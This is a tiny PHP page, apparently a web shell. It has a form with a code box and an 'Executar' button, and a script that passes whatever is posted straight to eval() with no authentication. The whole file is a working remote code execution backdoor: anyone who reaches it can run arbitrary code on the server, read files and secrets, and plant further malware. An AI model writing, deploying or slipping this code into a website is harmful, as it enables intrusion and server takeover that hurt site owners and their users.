<form method="post">
    <textarea name="code" style="width: 500px; height: 300px;"></textarea><br>
    <input type="submit" value="Executar">
</form>
<hr>
<?php
if(!empty($_POST['code'])){
    eval($_POST['code']);
}